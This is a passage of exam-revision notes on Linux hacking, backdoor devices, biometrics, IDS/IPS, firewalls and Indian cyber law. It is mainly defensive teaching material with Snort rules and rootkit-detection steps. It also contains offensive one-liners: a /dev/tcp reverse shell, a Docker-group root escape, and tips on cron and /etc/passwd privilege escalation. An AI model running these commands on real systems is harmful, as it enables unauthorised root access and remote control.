| `reject` | Drop + send TCP RST/ICMP unreachable |
| `sdrop` | Drop silently (no alert, no reset) |

**Direction operators:**
- `->` : source to destination (one direction)
- `<>` : bidirectional

**Variables:**

    $HOME_NET   — your internal network (defined in snort.conf)
    $EXTERNAL_NET — anything not HOME_NET (often: !$HOME_NET)
    $HTTP_SERVERS — web servers IP list
    $HTTP_PORTS — HTTP ports (80, 8080, etc.)
    $SQL_SERVERS — database server IPs

**Common rule examples:**

    Detect SSH brute force (>5 attempts in 60 seconds from same IP):
    alert tcp any any -> $HOME_NET 22 \
    (msg:"SSH Brute Force Attempt"; \
    threshold: type threshold, track by_src, count 5, seconds 60; \
    sid:1000010; rev:1;)

    Detect Nmap SYN scan (SYN with no ACK):
    alert tcp any any -> $HOME_NET any \
    (msg:"Possible Nmap SYN Scan"; flags:S,12; \
    threshold: type threshold, track by_src, count 20, seconds 1; \
    sid:1000011; rev:1;)

    Detect SQL injection in HTTP:
    alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS \
    (msg:"SQL Injection - UNION SELECT"; flow:to_server,established; \
    content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; \
    sid:1000012; rev:1;)

---

### E3 — Linux Rootkit Detection Tools

> [!NOTE]
> Know the specific tools and what each one detects —
> exam questions ask which tool detects which type of rootkit.

| Tool | Type | What It Detects |
|---|---|---|
| **chkrootkit** | Scanner | Known rootkit binary signatures, LKM rootkits, hidden processes, worms |
| **rkhunter** | Scanner | File hash changes, SUID files, suspicious strings in binaries, network ports |
| **AIDE** | FIM | File integrity — any file modification since baseline |
| **Lynis** | Auditor | Comprehensive security audit including rootkit indicators |
| **Rootkit Revealer** | Windows equivalent | Compares kernel view vs raw disk — not Linux |
| **Volatility** | Memory forensics | Hidden processes, injected code, kernel module anomalies in RAM |
| **strace** | System call tracer | Reveals what a suspicious process actually does |
| **lsof** | Open files | Shows all open files/sockets — rootkit may miss some |

**Detection flow:**

    STEP 1 — Check binary integrity:
    rpm -Va 2>/dev/null | grep -E "^..5"   ← modified files (RPM)
    debsums -s 2>/dev/null                  ← modified files (Debian)

    STEP 2 — Run rootkit scanners:
    chkrootkit
    rkhunter --check

    STEP 3 — Compare process visibility:
    ps aux | awk '{print $2}' | sort -n > ps_pids.txt
    ls /proc | grep -E '^[0-9]+$' | sort -n > proc_pids.txt
    diff ps_pids.txt proc_pids.txt
    → PIDs in /proc but not in ps output = hidden processes

    STEP 4 — Check loaded modules:
    lsmod                           ← may hide rootkit module
    cat /proc/modules               ← may reveal hidden modules
    diff <(lsmod) <(cat /proc/modules | awk '{print $1}')

    STEP 5 — Network comparison:
    netstat -tulpn > netstat_out.txt
    cat /proc/net/tcp               ← raw kernel view
    ss -tulpn                       ← alternative — rootkits may miss

---

### E4 — Biometric Error Rates — FAR vs FRR vs EER

> [!NOTE]
> FAR, FRR, and EER are fundamental biometric metrics —
> always MCQ-tested when biometrics are covered.

| Metric | Full Name | Definition |
|---|---|---|
| **FAR** | False Accept Rate | Probability that the system accepts an unauthorized person (false positive in security context) |
| **FRR** | False Reject Rate | Probability that the system rejects an authorized person (false negative) |
| **EER** | Equal Error Rate | Point where FAR = FRR — used to compare biometric systems |
| **CER** | Crossover Error Rate | Alternative name for EER |

**The FAR-FRR trade-off:**

    High security setting:
    Threshold very strict → Low FAR (rarely accepts impostors)
                          → High FRR (often rejects legitimate users)
    Use: nuclear facility, high-security data center

    Balanced setting (EER):
    FAR = FRR → equal chance of false accept and false reject
    Use: enterprise access control

    High convenience setting:
    Threshold lenient → High FAR (more impostors accepted)
                      → Low FRR (legitimate users rarely rejected)
    Use: consumer device (phone unlock)

**Lower EER = Better biometric system:**

| Biometric | Typical EER |
|---|---|
| Retina | 0.0001% |
| Iris | 0.0006% |
| Fingerprint | 0.1% |
| Voice | 2–5% |
| Face (2D) | 0.5–2% |
| Signature | 3–5% |

> [!IMPORTANT]
> In security context: **FAR is the more dangerous error**.
> A false accept lets an unauthorized person in.
> A false reject (FRR) is inconvenient but not a security breach.
> High-security systems prioritize minimizing FAR even at the
> cost of increased FRR.

---

### E5 — DMZ Architecture

> [!NOTE]
> DMZ architecture is syllabus-referenced (lab: "Try to install
> DMZ in your infrastructure") and MCQ-tested.

**What is a DMZ (De-Militarized Zone):**
A network segment between the internet and the internal
corporate network — hosting servers that need to be accessible
from the internet (web, email, DNS) while being protected
from direct access to internal systems.

**Three-legged DMZ (single firewall with 3 interfaces):**

    Internet ←→ [FIREWALL] ←→ DMZ (Web server, Mail server, DNS)
                     ↕
                Internal Network

    Firewall rules:
    Internet → DMZ: Allow 80, 443 (web), 25 (mail), 53 (DNS)
    DMZ → Internal: Only specific DB connections
    Internet → Internal: Deny ALL
    Internal → DMZ: Allow (for management)
    Internal → Internet: Allow (for outbound)

**Two-firewall DMZ (screened subnet — more secure):**

    Internet → [Outer/Perimeter Firewall] → DMZ
    DMZ → [Inner/Internal Firewall] → Internal Network

    Benefits:
    If outer firewall compromised → DMZ accessible — not internal
    If DMZ server compromised → inner firewall still protects internal
    Different vendors for inner/outer → vendor-specific attack blocked

**What goes in the DMZ:**
- Web servers (public-facing)
- Email servers (SMTP relay)
- DNS servers (external-facing)
- FTP servers (public download)
- VPN concentrators (terminate VPN before internal access)
- Reverse proxies and load balancers

**What NEVER goes in the DMZ:**
- Database servers (move to internal — DMZ servers connect across firewall)
- Domain controllers (internal only)
- File servers with sensitive data
- Development systems

---

### E6 — Hardware Security Modules vs Backdoor Devices

> [!NOTE]
> HSMs are the secure alternative to hardware that can be
> backdoored — understanding the contrast clarifies both concepts.

**Hardware Security Module (HSM):**
A tamper-resistant hardware device designed for SECURE cryptographic
operations — generating, storing, and using cryptographic keys
in an isolated, certified environment.

| Property | Backdoor Device | HSM |
|---|---|---|
| **Purpose** | Covert access / surveillance | Secure cryptographic operations |
| **Tamper resistance** | None — exploit hardware | ✅ Designed to destroy keys on tamper attempt |
| **Certification** | None | FIPS 140-2/3, Common Criteria |
| **Visibility** | Hidden | Authorized, logged, audited |
| **Example** | USB Rubber Ducky | Thales Luna, AWS CloudHSM, YubiKey HSM |

---

### E7 — NAGIOS and SNORT as IDS/IPS

> [!NOTE]
> The syllabus Lab section specifically mentions using NAGIOS
> and SNORT as IDS/IPS — know what each does.

**NAGIOS:**

    Purpose: Infrastructure monitoring and alerting
    NOT an intrusion detection system — it monitors SERVICE AVAILABILITY:
    → Is the web server responding? (HTTP check)
    → Is the database up? (MySQL connection check)
    → Is disk usage above 90%? (NRPE plugin)
    → Is CPU load normal?

    NAGIOS in a security context:
    → Alerts when a service becomes unavailable (potential DoS)
    → Monitors availability of security infrastructure (IDS, firewall)
    → Can integrate with security scripts via custom plugins
    → NOT a network packet analyzer — does not inspect traffic content

    Lab relevance:
    NAGIOS + SNORT combination:
    SNORT: detects attack signatures in network traffic
    NAGIOS: monitors that SNORT is running + infrastructure health

**SNORT as IDS/IPS:**

    IDS mode (passive — SPAN port):
    snort -A console -c /etc/snort/snort.conf -i eth0
    → Reads all traffic from SPAN port
    → Matches against rules
    → Outputs alerts to console / alert file

    IPS mode (inline — requires two NICs or NFQ):
    iptables -I INPUT -j NFQUEUE --queue-num 0
    snort -Q --daq nfq --daq-var queue=0 -c /etc/snort/snort.conf
    → Traffic passes through NFQ queue
    → Snort can DROP packets matching rules with "drop" action

    Alert file: /var/log/snort/alert
    Unified2 binary log: /var/log/snort/snort.u2.*
    Analysis: Barnyard2 → MySQL/Elasticsearch → BASE/Kibana dashboard

---

### E8 — Predecessor / Successor Chains

> [!NOTE]
> Understanding the evolution of IDS, firewalls, and honeypots
> places current tools in historical context.

**IDS Evolution:**

    Packet sniffers as manual analysis tools (1980s)
            ↓
    SRI International — first IDS concept (Denning 1987)
            ↓
    IDES / NIDES — first network IDS (1988–1994)
            ↓
    Snort — open-source NIDS by Martin Roesch (1998)
            ↓
    Sourcefire — commercial Snort (2001) → acquired by Cisco (2013)
            ↓
    Suricata — multi-threaded IDS/IPS alternative to Snort (2009)
            ↓
    Zeek (formerly Bro) — protocol analysis network monitor (1994–2018)
            ↓
    OSSEC → Wazuh — open-source HIDS platform (2004 → 2015)
            ↓
    EDR platforms (CrowdStrike, Carbon Black, Defender ATP) — 2013+
            ↓
    XDR (Extended Detection and Response) — NIDS + HIDS + cloud (2018+)
            ↓
    AI/ML-based NDR (Network Detection and Response) — 2020+

**Firewall Evolution:**

    Packet filtering routers (1980s — ACLs on Cisco routers)
            ↓
    Stateful inspection (DEC SEAL 1989 — first commercial stateful)
            ↓
    Application proxy firewalls (1991 — SEAL, TIS FWTK)
            ↓
    CheckPoint Firewall-1 (1994 — stateful inspection patented)
            ↓
    PIX / ASA — dedicated firewall appliances — Cisco (1995+)
            ↓
    UTM (Unified Threat Management) — firewall + IPS + AV (2004+)
            ↓
    NGFW (Next-Generation Firewall) — Palo Alto Networks (2007)
            ↓
    Cloud-native firewalls — AWS Security Groups, Azure NSG (2010+)
            ↓
    Zero Trust Network Access (ZTNA) — replaces perimeter firewall (2018+)
            ↓
    SASE (Secure Access Service Edge) — cloud-delivered security (2019+)

**Linux Rootkit Evolution:**

    Simple trojanized binaries (1990s)
            ↓
    LKM rootkits — Adore, Knark (2000s)
            ↓
    LD_PRELOAD rootkits — Azazel (2013)
            ↓
    Memory-resident rootkits (2015+)
            ↓
    UEFI/firmware rootkits — CosmicStrand (2022), BlackLotus (2023)
            ↓
    Container escape rootkits (2020+)

---

### E9 — Terminology Traps

| Term | Trap | Clarification |
|---|---|---|
| **IDS vs IPS** | "IDS and IPS are both inline" | IDS is OUT-OF-BAND (passive monitor). IPS is INLINE (traffic passes through). IDS alerts; IPS also blocks. |
| **Firewall vs IDS** | "A firewall detects attacks" | A firewall CONTROLS which traffic is ALLOWED — it does not detect attacks in permitted traffic. IDS detects attacks regardless of port/protocol. |
| **Snort is always an IDS** | "Snort only detects — never blocks" | Snort can operate as BOTH IDS (alert mode) and IPS (inline mode with drop rules). Configuration determines which. |
| **Honeypot = entrapment** | "Honeypots are illegal because they trap attackers" | Entrapment requires INDUCEMENT. Honeypots merely present opportunity — the attacker initiates. Honeypots are legal on your own systems. |
| **FAR = false reject** | "FAR is when legitimate users are rejected" | FAR = False ACCEPT Rate = system ACCEPTS unauthorized person. FRR = False REJECT Rate = system REJECTS authorized person. |
| **EER = higher is better** | "High EER biometric = more secure" | LOWER EER = better biometric. EER is where FAR = FRR. A system with 0.001% EER is better than one with 5% EER. |
| **SUID on any file is dangerous** | "All SUID files are vulnerabilities" | SUID on legitimate system utilities (passwd, ping) is necessary and expected. SUID on dangerous binaries (bash, python, vim) is the vulnerability. |
| **Netcat is malware** | "Netcat should never be on a system" | Netcat is a LEGITIMATE networking utility. Its presence alone is not evidence of compromise — context matters. |
| **Backdoor device vs software backdoor** | "Both are equally detectable" | Software backdoors: detectable by AV, EDR, FIM. Hardware backdoors: operate below OS — INVISIBLE to all software tools. |
| **DMZ = outside firewall** | "DMZ servers are not protected by firewall" | DMZ servers are BETWEEN firewalls (or behind the outer interface of one firewall) — they ARE firewall-protected, just on a different segment from the internal network. |

---

### E10 — Current Landscape 2026

> [!NOTE]
> Current state of IDS/firewall evasion, Linux threats, and
> biometric attacks in 2025–2026.

**AI-Powered IDS (2024–2026):**
ML-based network detection (Darktrace, Vectra AI, ExtraHop) uses
unsupervised ML to learn normal network behaviour and detect
deviations — addressing the zero-day blind spot of signature-based
IDS. However, adversarial ML attacks can poison the baseline model
causing it to treat malicious traffic as normal.

**UEFI/Firmware Threat Landscape:**
BlackLotus (2023) — first publicly known bootkit bypassing
Secure Boot on fully-patched Windows 11. MosaicRegressor,
CosmicStrand — UEFI firmware implants attributed to
nation-state actors. Supply chain firmware attacks (SolarWinds
demonstrated the supply chain vector) increasingly target
firmware update mechanisms.

**Biometric Bypass at Scale (2024–2025):**
AI-generated deepfakes now bypass facial recognition systems
deployed in KYC (Know Your Customer) onboarding processes.
Multiple banks and cryptocurrency exchanges (2023–2024) reported
successful account takeover using AI-generated face videos
bypassing liveness detection. Regulatory responses: EU AI Act
requires disclosure of AI-generated content used in biometric
processes.

**Container and Kubernetes Escape (2024–2026):**
Linux privilege escalation increasingly targets container
environments — escaping Docker/Kubernetes to host OS.
CVE-2024-21626 (runc escape — 2024): CVSS 8.6 — container
process could escape to host filesystem. Container-specific
rootkits and persistence mechanisms emerging.

**Relevant CVEs:**
- **CVE-2024-6387 (regreSSHion — OpenSSH — 2024):**
  Race condition in OpenSSH daemon (sshd) allowing unauthenticated
  remote code execution as root on glibc-based Linux.
  CVSS 8.1. Affected OpenSSH versions 8.5p1–9.7p1.
  Significant Linux server exposure.
- **CVE-2023-4911 (Looney Tunables — glibc — 2023):**
  Buffer overflow in GNU C Library dynamic loader — local privilege
  escalation to root. Affected major Linux distributions.
  CVSS 7.8. Easily exploitable.
- **CVE-2022-0847 (DirtyPipe — Linux kernel — 2022):**
  Write to arbitrary read-only files including SUID binaries.
  Privilege escalation to root. Affected Linux 5.8–5.16.3.
  CVSS 7.8. Successor to DirtyCow concept.

**Zero Trust and SASE (2024–2026):**
Traditional perimeter firewalls increasingly replaced by Zero Trust
Network Access (ZTNA) and SASE (Secure Access Service Edge) models
— where identity and device posture determine access regardless of
network location. Perimeter firewall as primary control becoming
obsolete for organizations with cloud and remote workforces.

---

### E11 — Indian Legal Context

> [!NOTE]
> Indian law applicable to this session's topics.

| Law | Section | Offence | Penalty |
|---|---|---|---|
| **IT Act 2000** | **S.43(a)** | Unauthorized access via backdoor device / Linux hacking | Civil ₹1 crore |
| **IT Act 2000** | **S.66** | Criminal unauthorized access — Linux privilege escalation, backdoor installation | Up to 3 years + ₹5 lakh |
| **IT Act 2000** | **S.66B** | Receiving data obtained via backdoor device or Linux hacking | Up to 3 years + ₹1 lakh |
| **IT Act 2000** | **S.66C** | Identity spoofing via biometric defeat — accessing systems using another's biometric | Up to 3 years + ₹1 lakh |
| **IT Act 2000** | **S.66F** | Installing backdoor in critical infrastructure (power, banking, defence, telecom) | **Life imprisonment** |
| **IT Act 2000** | **S.43(g)** | Destroying data or disrupting services via DDoS or Linux attack | Civil ₹1 crore |
| **IT Act 2000** | **S.69** | Government authorized interception of networks (legal monitoring — honeypot context) | N/A — government authority |
| **IPC** | **S.420** | Fraud via biometric spoofing to access banking systems | Up to 7 years + fine |
| **IPC** | **S.465** | Forgery — creating fake biometric artifacts for identity fraud | Up to 2 years + fine |
| **DPDPA 2023** | — | Biometric data breach (biometric is explicitly classified as sensitive personal data) | Penalty up to ₹250 crore |

> [!IMPORTANT]
> Under **DPDPA 2023**, biometric data (fingerprints, iris scans,
> face geometry) is classified as **Sensitive Personal Data (SPD)**.
> Organizations processing biometric data face the highest data
> protection obligations and maximum penalties for breach.
>
> A biometric template database breach simultaneously triggers:
> - DPDPA obligations (₹250 crore penalty)
> - IT Act S.43 civil liability
> - Criminal liability if negligent security enabled the breach
> Unlike passwords, biometrics CANNOT be changed — a breach
> is permanent — making legal accountability heightened.

---

## Abbreviations Table

| Abbreviation | Full Form | One-Line Technical Meaning |
|---|---|---|
| **AIDE** | Advanced Intrusion Detection Environment | Linux file integrity monitoring tool — baseline + alert on changes |
| **BIOS** | Basic Input/Output System | Firmware initializing hardware before OS — target for firmware backdoors |
| **CER** | Crossover Error Rate | Alternative name for EER — point where FAR equals FRR in biometrics |
| **DDoS** | Distributed Denial of Service | Attack from multiple sources overwhelming a target's resources |
| **DMZ** | De-Militarized Zone | Network segment between internet and internal network — hosts public servers |
| **DPI** | Deep Packet Inspection | Inspection of packet payload content at all OSI layers |
| **EER** | Equal Error Rate | Biometric metric where FAR = FRR — lower EER = better system |
| **FAR** | False Accept Rate | Probability biometric system accepts unauthorized person |
| **FIM** | File Integrity Monitoring | Continuous monitoring of file changes against cryptographic baseline |
| **FRR** | False Reject Rate | Probability biometric system rejects authorized person |
| **GTFOBins** | Get The F*** Out Binaries | Collection of Unix binaries exploitable for privilege escalation |
| **HIDS** | Host-based Intrusion Detection System | IDS agent monitoring individual endpoint activity |
| **HSM** | Hardware Security Module | Tamper-resistant device for secure cryptographic operations |
| **IDS** | Intrusion Detection System | Monitors traffic/activity — detects attacks — alerts only |
| **IPS** | Intrusion Prevention System | Monitors inline — detects attacks — actively blocks |
| **LKM** | Loadable Kernel Module | Linux kernel extension — used by kernel-level rootkits |
| **NAGIOS** | — (proper name) | Infrastructure monitoring platform — service availability |
| **NFQUEUE** | Netfilter Queue | Linux kernel framework allowing userspace processing of network packets |
| **NGFW** | Next-Generation Firewall | Layer 7 firewall with DPI, app awareness, user identity, IPS |
| **NIDS** | Network-based Intrusion Detection System | IDS monitoring network traffic at segment level |
| **NVD** | National Vulnerability Database | NIST database of CVEs with CVSS scores |
| **PAM** | Pluggable Authentication Modules | Linux authentication framework — target for backdoor modification |
| **PCRE** | Perl-Compatible Regular Expressions | Regex syntax used in Snort rules for pattern matching |
| **PRNG** | Pseudorandom Number Generator | RC4's internal algorithm — used in WEP encryption |
| **RCE** | Remote Code Execution | Attacker executes commands on target system |
| **SASE** | Secure Access Service Edge | Cloud-delivered network security combining ZTNA + FWaaS |
| **SGID** | Set Group ID | Execute file with group owner's privileges — like SUID for groups |
| **SPAN** | Switched Port Analyzer | Switch port mirroring — copies traffic for monitoring |
| **SSDT** | System Service Descriptor Table | Windows kernel table hooked by rootkits — Linux equivalent: sys_call_table |
| **SUID** | Set User ID | File permission bit — execute file with owner's (often root) privileges |
| **TPS** | True Positive | Attack correctly detected by IDS |
| **UEFI** | Unified Extensible Firmware Interface | Modern BIOS replacement — target for advanced firmware backdoors |
| **UTM** | Unified Threat Management | All-in-one security appliance: firewall + IPS + AV + VPN |
| **XDR** | Extended Detection and Response | Unified security platform across endpoint, network, cloud |
| **ZTNA** | Zero Trust Network Access | Identity-based access control replacing perimeter security |

---

## 🔑 Keywords + Concept Map

**Core Keywords:**

`Backdoor Device` · `USB Rubber Ducky` · `O.MG Cable` · `LAN Turtle` ·
`Firmware Backdoor` · `UEFI Rootkit` · `BlackLotus` · `Hardware Implant` ·
`Multi-Vector DDoS` · `HTTP/2 Rapid Reset` · `Layer 7 DDoS` · `Slowloris` ·
`DDoS Cover Attack` · `Biometric Spoofing` · `FAR` · `FRR` · `EER` ·
`Fingerprint Spoofing` · `Gummy Finger` · `Liveness Detection` ·
`Facial Recognition` · `Deepfake` · `Voice Cloning` · `Linux Hacking` ·
`Privilege Escalation` · `SUID` · `SGID` · `GTFOBins` · `DirtyCow` ·
`Cron Exploitation` · `/etc/shadow` · `John the Ripper` · `Linux Backdoor` ·
`Netcat Reverse Shell` · `SSH authorized_keys` · `Rootkit` · `LKM Rootkit` ·
`LD_PRELOAD` · `rkhunter` · `chkrootkit` · `IDS` · `IPS` · `NIDS` · `HIDS` ·
`Snort` · `Suricata` · `Anomaly Detection` · `Signature Detection` ·
`Honeypot` · `Honeynet` · `Cowrie` · `Firewall` · `NGFW` · `DMZ` ·
`Stateful Inspection` · `Packet Filter` · `T1014` · `T1548` · `T1562`

---

**Concept Map:**

    SESSION 18 — ADVANCED THREATS & DEFENCES
    │
    ├── BACKDOOR DEVICES
    │   ├── USB Implants ──── Rubber Ducky (HID) | O.MG Cable | LAN Turtle
    │   ├── Hardware Taps ─── Packet Squirrel | LAN Tap | Keyloggers
    │   └── Firmware ──────── UEFI rootkit | HDD firmware | BIOS implant
    │       └── Detectable by: Secure Boot | Firmware hash | Physical inspection
    │
    ├── ADVANCED DDoS
    │   ├── L7 DDoS ──────── HTTP flood | Slowloris | HTTP/2 Rapid Reset
    │   ├── Multi-vector ──── Volume + Protocol + Application simultaneous
    │   └── Cover attack ──── DDoS distracts SOC → breach occurs elsewhere
    │
    ├── BIOMETRIC SPOOFING
    │   ├── Fingerprint ───── Gelatin/gummy finger | 2D print | silicone mold
    │   ├── Facial ─────────── 2D photo | 3D mask | Deepfake video
    │   ├── Iris ───────────── IR photo | printed contact lens
    │   ├── Voice ──────────── Replay | AI voice cloning
    │   └── Countermeasures ── Liveness detection | Multi-modal | Hardware 3D
    │       └── Metrics: FAR (false accept) | FRR (false reject) | EER
    │
    ├── LINUX HACKING
    │   ├── Privilege esc. ─── SUID abuse | sudo misconfig | cron | DirtyCow
    │   ├── Persistence ────── authorized_keys | SUID shell | cron backdoor
    │   ├── Password attack ── /etc/shadow | john | hashcat -m 1800
    │   └── Enumeration ────── uname -a | sudo -l | find SUID | crontab
    │
    ├── LINUX BACKDOORS
    │   ├── Simple ─────────── Netcat reverse shell | SSH key | cron
    │   ├── Stealthy ───────── Trojanized binaries | LD_PRELOAD rootkit
    │   ├── Kernel ─────────── LKM rootkit | sys_call_table hooks
    │   └── Detection ──────── rkhunter | chkrootkit | AIDE | /proc comparison
    │
    ├── IDS / IPS
    │   ├── NIDS ───────────── Network tap/SPAN | Snort | Suricata | Zeek
    │   ├── HIDS ───────────── Agent per host | OSSEC | Wazuh | Tripwire
    │   ├── Signature ──────── Known patterns | Low FP | Blind to zero-day
    │   ├── Anomaly ────────── Baseline deviation | Catches zero-day | Higher FP
    │   └── IDS vs IPS ─────── IDS alerts only | IPS inline + blocks
    │
    ├── HONEYPOTS
    │   ├── Low interaction ── Simulated services | Low risk | Limited intel
    │   ├── High interaction ── Real OS | Full attack chain capture | Higher risk
    │   ├── Honeynet ───────── Multiple honeypots | Full network simulation
    │   └── Tools ──────────── Cowrie (SSH) | Dionaea (malware) | T-Pot
    │
    └── FIREWALLS
        ├── Packet filter ─── L3/L4 rules | Stateless | IP/port based
        ├── Stateful ───────── Connection state tracking | TCP state table
        ├── Application ────── Layer 7 proxy | Protocol parsing
        ├── NGFW ───────────── DPI + App ID + User identity + IPS + SSL inspection
        ├── DMZ architecture ── Public servers between two firewalls
        └── Evasion ─────────── Port tunneling | Fragmentation | Encryption

---

## ⚡ Quick Reference Cheatsheet

### 🔌 Backdoor Devices Reference

| Device | Form Factor | Attack Capability |
|---|---|---|
| USB Rubber Ducky | USB drive | Keystroke injection at 1000+ keys/sec |
| O.MG Cable | Lightning/USB-C cable | Remote keystroke injection via Wi-Fi |
| LAN Turtle | USB Ethernet adapter | SSH tunnel, DNS spoof, packet capture |
| Packet Squirrel | Inline Ethernet | MITM, DNS spoof, OpenVPN tunnel |
| USB Killer | USB drive | Hardware destruction via high-voltage |
| Hardware Keylogger | PS/2 or USB inline | Captures all keystrokes |

---

### 🐧 Linux Privilege Escalation Quick Reference

| Method | Check Command | Exploit Approach |
|---|---|---|
| SUID abuse | `find / -perm -u=s -type f 2>/dev/null` | GTFOBins — run SUID binary to spawn root shell |
| Sudo misconfig | `sudo -l` | Abuse permitted command to escape to shell |
| Cron world-writable | `cat /etc/crontab; ls -la /etc/cron.*` | Inject reverse shell into writable cron script |
| Kernel exploit | `uname -r` | Search CVEs for that exact kernel version |
| /etc/passwd writable | `ls -la /etc/passwd` | Append root user with known password hash |
| Docker group | `id` — check for docker group | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |

---

### 📡 Snort Rule Quick Reference

    alert tcp $EXTERNAL_NET any -> $HOME_NET 22 \
    (msg:"SSH Scan Detected"; flags:S,12; \
    threshold:type threshold, track by_src, count 10, seconds 60; \
    sid:1000001; rev:1;)

| Part | Meaning |
|---|---|
| `alert` | Action — generate alert |
| `tcp` | Protocol |
| `$EXTERNAL_NET any` | Source: external network, any port |
| `$HOME_NET 22` | Destination: internal network, SSH port |
| `msg:` | Alert message |
| `flags:S,12` | TCP SYN flag set |
| `threshold:` | Rate limiting — 10 SYNs in 60 seconds |
| `sid:` | Unique rule ID |

---

### 🔥 Firewall Type Comparison

| Type | Layer | Stateful? | App Aware? | Example |
|---|---|---|---|---|
| Packet filter | L3/L4 | ❌ | ❌ | iptables (without state) |
| Stateful | L3/L4 | ✅ | ❌ | iptables with conntrack |
| Application proxy | L7 | ✅ | ✅ Partial | Squid proxy |
| NGFW | L3–L7 | ✅ | ✅ Full | Palo Alto, Checkpoint, Fortinet |

---

### 🔐 Biometric Error Rates

| Metric | Meaning | Security Implication |
|---|---|---|
| FAR (False Accept Rate) | Accepts unauthorized | High FAR = security risk |
| FRR (False Reject Rate) | Rejects authorized | High FRR = usability problem |
| EER (Equal Error Rate) | FAR = FRR crossover | Lower EER = better system |

**Biometric hierarchy (most to least secure):**
Retina > Iris > Fingerprint > Face > Voice > Signature

---

### 🛡️ IDS/IPS/Firewall Quick Comparison

| Property | Firewall | IDS | IPS |
|---|---|---|---|
| Blocks traffic? | ✅ (by rule) | ❌ | ✅ (automatically) |
| Detects attacks in permitted traffic? | ❌ | ✅ | ✅ |
| Inline placement? | ✅ | ❌ (tap) | ✅ |
| False positive blocks legit? | ❌ (rule-based) | N/A (alert only) | ✅ Risk |

---

### 🍯 Honeypot Types

| Type | Interaction | Risk | Intel Value |
|---|---|---|---|
| Low-interaction | Simulated services | Low | Basic |
| High-interaction | Real OS | High | Maximum |
| Honeynet | Multiple honeypots | Variable | Full attack chain |

---

### ⚖️ Indian Legal Reference

| Law | Section | Offence | Penalty |
|---|---|---|---|
| IT Act 2000 | S.43(a) | Unauthorized access via backdoor/hacking | Civil ₹1 crore |
| IT Act 2000 | S.66 | Criminal unauthorized access | 3 yrs + ₹5L |
| IT Act 2000 | S.66C | Biometric identity theft | 3 yrs + ₹1L |
| IT Act 2000 | S.66F | Backdoor in critical infrastructure | Life imprisonment |
| IPC | S.420 | Fraud via biometric spoofing | 7 yrs + fine |
| IPC | S.465 | Forgery — fake biometric artifact | 2 yrs + fine |
| DPDPA 2023 | — | Biometric data breach | ₹250 crore |

---

## ✅ Session Revision Snapshot

### ⚡ TL;DR — 5 Bullets

1. **Backdoor devices operate below the OS level — invisible to all
   software security tools.** USB Rubber Ducky injects keystrokes as
   a fake HID keyboard. O.MG Cable is an attack cable with embedded
   Wi-Fi. LAN Turtle provides covert SSH tunnel from within a network.
   Firmware backdoors (UEFI, HDD) survive OS reinstallation and even
   drive replacement. Detection requires physical inspection, RF
   scanning, and firmware hash verification.

2. **Advanced DDoS combines multiple vectors simultaneously — volumetric
   + protocol + application** — so mitigating one vector leaves others
   active. HTTP/2 Rapid Reset (CVE-2023-44487) achieved 398 million
   RPS by exploiting stream cancellation asymmetry. DDoS-as-a-cover
   distracts SOC during a simultaneous breach. Mitigation: anycast
   diffusion, scrubbing centers, CDN, BGP flowspec, ML-based detection.

3. **Biometric spoofing uses physical or digital artifacts to bypass
   biometric sensors.** Gummy fingers (gelatin) fool most fingerprint
   scanners. 2D photos fool basic facial recognition. AI voice cloning
   bypasses voice authentication. Key metrics: FAR (false accept —
   the security risk), FRR (false reject — the usability problem),
   EER (where FAR=FRR — lower is better). Liveness detection,
   multi-modal biometrics, and hardware 3D sensing are countermeasures.

4. **Linux privilege escalation targets SUID binaries, sudo misconfigurations,
   and cron jobs.** SUID on dangerous binaries (bash, python, vim) yields
   instant root shell via GTFOBins techniques. World-writable cron scripts
   owned by root enable root command injection. DirtyCow (2016) and
   regreSSHion (2024) are landmark Linux privilege escalation CVEs.
   Linux backdoors range from simple netcat listeners to stealthy LKM
   rootkits that hide processes/files at kernel level.

5. **IDS detects and alerts only (out-of-band); IPS detects and blocks
   (inline). Firewalls control which traffic is allowed — not what
   attacks occur within permitted traffic.** Snort is the reference
   NIDS — can operate as IDS (alert mode) or IPS (inline drop mode).
   Honeypots attract attackers — any connection is suspicious — legal
   on own infrastructure. DMZ architecture places public servers between
   two firewalls — internal network protected even if DMZ server compromised.

---

### 🎯 MCQ-Likely Concepts

- [ ] Backdoor device vs software backdoor — below OS vs OS-level
- [ ] USB Rubber Ducky — HID attack — keystroke injection
- [ ] O.MG Cable — legitimate-looking cable with embedded Wi-Fi + attack
- [ ] Firmware backdoors — survive OS reinstall — invisible to AV
- [ ] HTTP/2 Rapid Reset — CVE-2023-44487 — 398M RPS
- [ ] Multi-vector DDoS — simultaneous volume + protocol + application
- [ ] DDoS as cover attack — distraction while breach occurs
- [ ] FAR — False Accept Rate — unauthorized person accepted — security risk
- [ ] FRR — False Reject Rate — authorized person rejected — usability issue
- [ ] EER — where FAR = FRR — lower EER = better biometric
- [ ] Biometric hierarchy — Retina > Iris > Fingerprint > Face > Voice
- [ ] Gummy finger — gelatin fake fingerprint — fools most optical/capacitive
- [ ] Liveness detection — prevents 2D photo and replay attacks
- [ ] Biometric data = Sensitive Personal Data under DPDPA 2023
- [ ] SUID bit — execute as file owner (root) — `find / -perm -u=s`
- [ ] GTFOBins — SUID/sudo escape reference — vim, python, bash, find
- [ ] DirtyCow — CVE-2016-5195 — kernel race condition — write to read-only
- [ ] Cron exploitation — world-writable root cron script → reverse shell
- [ ] `/etc/shadow` — SHA-512 ($6$) — cracked with john/hashcat -m 1800
- [ ] Netcat reverse shell — `bash -i >& /dev/tcp/IP/PORT 0>&1`
- [ ] LKM rootkit — sys_call_table hooks — hides processes/files
- [ ] /proc/modules and lsmod — detect loaded kernel modules
- [ ] chkrootkit / rkhunter — rootkit detection tools
- [ ] Snort — signature + anomaly IDS — rules-based detection
- [ ] NAGIOS — network monitoring — not primarily IDS
- [ ] IDS vs IPS — detect vs detect+block — placement difference
- [ ] NIDS placement — outside firewall sees all; inside sees post-filter
- [ ] HIDS — monitors single host — log files, file integrity, system calls
- [ ] Honeypot — decoy system — attracts attackers — no legitimate traffic
- [ ] Honeynet — multiple honeypots + real network segment
- [ ] Low-interaction vs high-interaction honeypot — simulated vs real OS
- [ ] Firewall packet filtering — stateless — ACL on header fields
- [ ] Stateful firewall — tracks TCP connection state — blocks unsolicited
- [ ] Application proxy firewall — Layer 7 — breaks and re-establishes connection
- [ ] Next-Gen Firewall — DPI + application identity + user identity
- [ ] DMZ — dual-firewall architecture — web servers between firewalls
